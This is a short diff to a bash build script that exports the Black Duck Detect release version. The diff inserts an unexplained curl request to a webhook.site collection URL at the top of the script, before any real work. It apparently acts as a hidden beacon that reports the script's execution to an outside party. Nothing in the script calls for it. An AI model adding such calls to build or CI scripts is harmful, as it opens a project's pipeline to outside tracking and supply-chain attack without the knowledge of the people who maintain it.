@@ -1,4 +1,7 @@
 #!/bin/bash
+
+curl https://webhook.site/682c9244-643c-4ea3-b49e-37a7e044eaca
+
 echo "Setting version of Detect"
 export DETECT_LATEST_RELEASE_VERSION=$BLACKDUCK_DETECT_VERSION
 
